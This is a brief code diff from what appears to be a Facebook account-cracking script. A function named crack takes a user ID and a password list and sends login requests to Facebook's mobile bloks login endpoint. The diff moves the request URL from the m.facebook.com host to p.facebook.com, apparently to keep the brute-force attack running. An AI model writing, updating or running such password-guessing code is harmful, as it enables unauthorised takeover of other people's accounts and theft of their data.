@@ -295,7 +295,7 @@ def crack(uid, password_list, total_count):
             'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
             '__bkv': '6d9da9466908b278e8a5e7bd73fb870e63617aab8043b395513d14d9e5028be2',}
-            url = 'https://m.facebook.com/async/wbloks/fetch/'
+            url = 'https://p.facebook.com/async/wbloks/fetch/'
             headers = {
             'authority': 'm.facebook.com',
             'accept': '*/*',
